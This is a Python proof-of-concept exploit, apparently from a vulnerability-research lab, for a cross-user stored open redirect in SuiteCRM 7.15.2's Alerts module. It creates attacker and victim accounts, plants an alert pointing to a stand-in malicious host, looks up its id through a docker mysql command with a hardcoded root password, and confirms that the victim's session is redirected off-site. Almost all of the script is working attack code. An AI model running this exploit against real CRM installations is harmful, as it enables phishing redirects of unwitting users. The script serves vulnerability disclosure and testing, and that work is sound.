#!/usr/bin/env python3
"""
VULN-055 — Alerts action_redirect: cross-user stored open redirect

Software:    SuiteCRM 7.15.2 (forkedSuite commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb)
Sink:        modules/Alerts/controller.php:140-148 (action_redirect: BeanFactory::
             getBean('Alerts', $_GET['record']) with no owner/ACL scoping, then
             SugarApplication::redirect($bean->url_redirect) verbatim).
Plant path:  modules/Alerts/controller.php:80-118 (action_add stores
             $_POST['url_redirect'] verbatim on an alert owned by the caller).

What this script does
----------------------
1. Creates TWO fresh, unrelated, low-privileged users -- "attacker" and
   "victim" -- via the admin-provisioning primitive. Neither is an admin;
   they share no relationship.
2. As the ATTACKER, plants an Alert with a malicious url_redirect via the
   normal, legitimate action=add flow (this is *their own* alert -- action_add
   scopes assigned_user_id to $current_user, so planting is not itself a bug).
3. Reads back the new alert's id (via the db container, matched on a random
   reminder_id the attacker chose -- action_add's JSON response only echoes
   {"result": 1}, not the id, so this is just "find what I created").
4. As the VICTIM (a completely different session/user who never touched the
   attacker's alert), sends module=Alerts&action=redirect&record=<attacker's
   alert id> and asserts the response redirects off-site to the attacker's
   URL -- proving action_redirect's record lookup has NO owner/ACL check:
   any authenticated user can trigger ANY other user's stored alert redirect
   purely by guessing/leaking its id.
"""
import os
import sys
import subprocess

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, BROWSER_UA, log, banner, rand, verdict,
                      admin_session, create_user, web_login)  # noqa: E402

VULN_ID = "VULN-055"
TITLE = "Alerts action_redirect -- cross-user stored open redirect"

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE_DIR = os.path.join(HERE, "evidence")
COMPOSE_CWD = "/opt/cvehunter/targets/SuiteCRM"


def db_query(sql):
    r = subprocess.run(
        ["docker", "compose", "-p", "cvehunterlab_suitecrm", "exec", "-T", "db",
         "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-N", "-e", sql],
        cwd=COMPOSE_CWD, capture_output=True, text=True, timeout=30,
    )
    return r.stdout.strip(), r.stderr.strip()


def main():
    banner(VULN_ID, TITLE)
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    attacker_url = f"https://evil-cvehunter-{rand('c055')}.example/redir"

    log("SETUP", "Provisioning two independent low-privileged users: attacker + victim")
    a = admin_session()
    attacker = create_user(a, "LowPriv@2026x!")
    victim = create_user(a, "LowPriv@2026x!")
    log("OK", f"attacker={attacker['user_name']} victim={victim['user_name']}"
              " (unrelated accounts, no ownership between them)")

    log("STEP", "ATTACKER plants an alert with a malicious url_redirect"
                " (module=Alerts action=add -- their own alert, legitimately owned)")
    s_att = web_login(attacker["user_name"], attacker["password"])
    reminder_id = rand("rem")
    add_body = {"reminder_id": reminder_id, "url_redirect": attacker_url,
                "name": "malicious-reminder", "description": "planted by attacker"}
    r_add = s_att.post(f"{BASE_URL}/index.php",
                        data={"module": "Alerts", "action": "add", **add_body},
                        headers={"User-Agent": BROWSER_UA}, timeout=30)
    log("OK", f"action=add -> HTTP {r_add.status_code} body={r_add.text.strip()!r}")

    log("STEP", "Reading back the planted alert's id (matched on reminder_id)")
    alert_id, err = db_query(f"SELECT id FROM alerts WHERE reminder_id='{reminder_id}' "
                              f"AND assigned_user_id="
                              f"(SELECT id FROM users WHERE user_name='{attacker['user_name']}');")
    if not alert_id:
        log("FAIL", f"could not locate planted alert (db stderr: {err})")
        verdict(VULN_ID, "FAILED", "planted alert not found in DB")
        return 1
    log("OK", f"attacker's alert id={alert_id} (assigned_user_id=attacker, confirmed via DB)")

    with open(os.path.join(EVIDENCE_DIR, "plant_alert.txt"), "w") as f:
        f.write(f"attacker: {attacker['user_name']} (id={attacker['id']})\n"
                f"victim:   {victim['user_name']} (id={victim['id']})\n"
                f"planted alert id: {alert_id}\n"
                f"planted url_redirect: {attacker_url}\n"
                f"action=add response: {r_add.status_code} {r_add.text.strip()}\n")

    # --- The actual attack: a DIFFERENT, unrelated user triggers it ---------
    log("STEP", "VICTIM (different user, never saw the attacker's alert) triggers"
                f" module=Alerts&action=redirect&record={alert_id}")
    s_vic = web_login(victim["user_name"], victim["password"])
    url = f"{BASE_URL}/index.php"
    params = {"module": "Alerts", "action": "redirect", "record": alert_id}
    r = s_vic.get(url, params=params, headers={"User-Agent": BROWSER_UA},
                   allow_redirects=False, timeout=30)

    request_txt = (
        f"GET {r.url.replace(BASE_URL, '')} HTTP/1.1\r\n"
        f"Host: {BASE_URL.split('//', 1)[1]}\r\n"
        f"User-Agent: {BROWSER_UA}\r\n"
        f"Cookie: (authenticated session of VICTIM {victim['user_name']}, NOT the attacker)\r\n"
        f"\r\n"
    )
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(request_txt)

    resp_headers = "\r\n".join(f"{k}: {v}" for k, v in r.headers.items())
    response_txt = f"HTTP/1.1 {r.status_code} {r.reason}\r\n{resp_headers}\r\n\r\n{r.text[:2000]}"
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(response_txt)

    location = r.headers.get("Location", "")
    log("PROOF", f"HTTP {r.status_code} {r.reason}")
    log("PROOF", f"Location: {location!r}  (victim session, attacker-owned alert id)")

    with open(os.path.join(EVIDENCE_DIR, "location_header.txt"), "w") as f:
        f.write(f"victim ({victim['user_name']}) GET /index.php?module=Alerts&action=redirect"
                f"&record={alert_id}  (alert owned by attacker {attacker['user_name']})\n\n"
                f"response status: {r.status_code}\nLocation: {location}\n")

    ok = (300 <= r.status_code < 400) and location == attacker_url
    if ok:
        log("OK", "A user with ZERO relationship to the alert's owner was redirected"
                   " off-site to the attacker's URL -- action_redirect has no"
                   " owner/ACL scoping on the record lookup (cross-user IDOR).")
        verdict(VULN_ID, "CONFIRMED",
                f"victim {victim['user_name']} redirected (HTTP {r.status_code}) to"
                f" {location} via attacker's alert {alert_id}")
        return 0
    else:
        log("FAIL", f"did not observe the expected cross-user off-site redirect "
                     f"(status={r.status_code}, location={location!r})")
        verdict(VULN_ID, "FAILED", "no cross-user off-site Location observed -- see run.log")
        return 1


if __name__ == "__main__":
    sys.exit(main())
